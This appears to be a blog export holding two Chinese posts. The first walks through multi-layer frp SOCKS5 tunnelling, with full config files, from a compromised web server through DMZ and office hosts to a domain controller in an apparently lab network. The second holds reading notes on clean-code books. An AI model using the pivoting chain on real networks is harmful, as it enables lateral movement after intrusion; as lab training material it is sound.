[{"title":"frp之一层网络代理 / 二层网络代理 / 三层网络代理","url":"/2022/11/04/frp之一层网络代理  二层网络代理  三层网络代理/","content":"\n# frp之一层网络代理 / 二层网络代理 / 三层网络代理\n\n\n\n![image-20221103155324246](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png)\n\n\n\n### # 一层网络代理\n\n获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。\n\n1. 使用VPS作为FRP服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 用Windows Server 2012作为客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5]\nremote_port = 1080             # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n3. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n4. 命令前加上proxychains4\n\n```bash\nproxychinas4 ssh root@10.10.10.15\n```\n\n****\n\n\n\n### # 二层网络代理\n\n经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上起一个frp客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在DMZ区的10.10.10.15 Ubuntu上执行\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5]\ntype = tcp\nremote_port = 10808            # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n5. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n6. 命令前加上proxychains4\n\n```bash\nproxychinas4 rdesktop 192.168.30.20\n```\n\n***\n\n\n\n### # 三层网络代理\n\n通过代理访问到核心区的**192.168.60.10域控制器**\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在VPS上的FRP服务端上绑定的IP地址\nbind_port = 7000       # 在VPS上的FRP服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上执行以下命令：\n\n启动frp客户端，将本地端口10808转发到VPS的1080端口。\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# 客户端配置文件frpc.ini的内容如下\n[common]\nserver_addr = 192.168.2.200    # 指向VPS上frp服务端绑定的ip地址\nserver_port = 7000             # 指向VPS上frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在**DMZ区**的10.10.10.15 Ubuntu上执行，启动一个客户端\n\n启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 192.168.30.40       # 本地监听的IP地址\nlocal_port = 10809             # 要转发的本地端口\nremote_port = 10808            # 要转发到的远程端口\n```\n\n5. 在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 192.168.30.40      # 指定frp服务器端ip地址\nbind_port = 7000               # 指定frp服务端绑定端口\n```\n\n6. 在办公区的文件服务器上执行\n\n启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.30.40    # 指向Ubantu服务器上的 frp 服务端IP地址\nserver_port = 7000             # 指向Ubantu服务器上的 frp 服务端端口\n[socks5]\ntype = tcp\nremote_port = 10809            # 代理所用的端口，会被转发到服务器\nplugin = socks5                # 代理类型\n```\n\n7. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n8. 命令前加上proxychains4\n\n```\nproxychinas4 rdesktop 192.168.60.10\n```\n\n"},{"title":"《代码精进之路》与《代码整洁之道》-读书笔记","url":"/2022/01/30/《代码精进之路》与《代码整洁之道》读书笔记/","content":"\n本文通过对部分重点内容罗列的方式对此两本书的读书笔记进行记录。\n\n> 《代码整洁之道-程序员的职业素养》\n\n## 软件开发原则\n\n所有软件项目的根本指导原则是，软件要**易于修改**。如果违背这条原则搭建僵化的结构，就破坏了构建整个行业的经济模型。\n\n## 必备技能\n\n软件开发人员必须精通的事项：\n\n* 设计模式：必须能描述 GOF 书中的全部 24 种模式和，同时还要有 POSA 书中的多数模型的实践经验。\n* 设计原则：必须了解 SOLID 原则，而且要深刻理解组件设计原则。\n* 方法：必须理解 XP、Scrum、精益、看板、瀑布、结构化和分析以及结构化编程。\n* 实践：必须掌握测试驱动开发，面向对象设计，结构化编程，持续集成和结对编程。\n* 工作：必须了解如何使用 UML 图，DFD 图，结构图，Petri 网络图，状态迁移图表，流程图和决策表。\n\n## 不要说“我试试”\n\n* 这种类型的描述并不是承诺，实际上并没有实际意义。\n* 而且这通常意味着你之前评估周期的时候**并没有竭尽全力**，否则为什么在压缩周期的讨论中还要再说“我试试”呢。\n\n## 重新定义“完成”\n\n* 有的时候，我们自欺欺人的认为任务已经完成的足够好了，然后转入下一项任务。我们会给自己找借口说，其他还没来得及完成的工作可以等到时间更充裕的时候来处理。甚至有的时候，我们会把代码提交定义为”任务完成“。这样显然是错误的。\n* 真正的任务完成，是已经通过了测试，并且上线完成等。\n\n## 寻求帮助\n\n* 编程并非易事。越年轻的程序员可能越没有感觉，毕竟代码只不过是一堆 if 和 while 语句而已。但是随着经验增长，你会开始意识到把这些 if 和 while 语句组装在一起并非易事。不能期望将他们简单的组装到一起就能得到最好的代码。相反，必须小心谨慎地将系统分解为易于理解的单元，同时使得这些单元之间的联系越少越好。\n* 因此，仅凭一己之力很难写出足够优秀的代码，即使你的技艺足够高超。**也一定能从另外一名程序员的思考和想法中获益。**\n\n## 重新认识争论\n\n* 凡是不能在 5 分钟内解决的争论，都不能通过辩论来解决。争论之所以要花费这么长时间，是因为争论双方都拿不出足够有力的证据，这个时候争论依据的不是事实，而是信念。\n\n## 团队\n\n* 成员需要克服个体差异性，默契配合，彼此信任，形成真正有凝聚力的团队，是需要一些时间的。可能需要 6 个月，甚至一年，但是，凝聚力一旦形成，就会产生一种神奇的魔力。团队成员会一起做计划，一起解决问题，一起面对问题，**一起解决一切**。\n\n> 《代码精进之路》\n\n## 命名\n\n一般来说我们都知道命名应该有可读性，但是像这里介绍这么详细的并不多。\n\n例如我们针对命名可以通过固定分段限定词的方式进行统一：\n\n* `[动作][对象][范畴]`，来统一我们的命名，例如 `getRevenueTotal(获取总收入)`。\n\n## 注释\n\n* 注释如果是对执行过程的简单复述，那么这样的注释不应该存在。\n* 我们可以通过函数和中间变量的封装，来减少可以避免的注释。\n\n## 错误和错误码\n\n我们可以通过以下几种方式处理错误（中后台系统比较合适）：\n\n1. 程序运行期间的错误，一般我们可以通过 Error 打印到日志中，而且这类错误，最好和报警系统进行对接，直接输出到报警系统中。\n2. API/服务调用错误，这种错误一般通过错误码返回给调用端的同时，也需要在日志做好记录。\n\n> 关于错误码：错误码我们可以使用数字或者显示化错误码，数字的坏处即我们需要额外维护错误码表，调用者可能并非我们团队，有可能造成沟通障碍。\n> 因此，更建议使用**显示化错误码**，并且可以做一个约定：P 代表参数异常，B 代表业务异常，S 代表系统异常，例如：P_Customer_NameIsNull 客户姓名不能为空\n\n## 代码中的破窗效应\n\n破窗效应在代码中很常见，通常在我们完成一个功能的时候，都是基于现有代码的改动，如果你可以基于一个现有代码的不良设计完成功能（例如，在已经很混乱的事件订阅类增加一个 Enum、在已经很冗长的 Http 请求列表复制一个新的出来），那么大概率你会这样做而不是重构，**特别是当这个不良设计不是你最初写的时候，就更加可以心安理得的改代码而没有任何负罪感，甚至在 Code Review 的时候都可以有充足的理由：它已经是这样了，这次先上，将来找个时间整体重构才行。**\n\n## SLAP\n\nSLAP：Single Level of Abstraction Principle，抽象层次一致性\n\nSLAP 要求函数体中的内容必须在同一个抽象层次上，如果高层次抽象和低层次细节杂糅在一起，就会显得凌乱，难以理解。\n\n## 如何述职\n\n* 方法1: **提出问题，定义问题，分析问题，解决问题，最后展望未来**。这个也是麦肯锡常用的方法。\n* 方法2: 我们说事情的时候，应该像电影镜头一样，先由远拉近，再由近拉远。从宏观背景，到怎么做的，到结果和思考。\n\n\n","tags":["读书笔记"]}]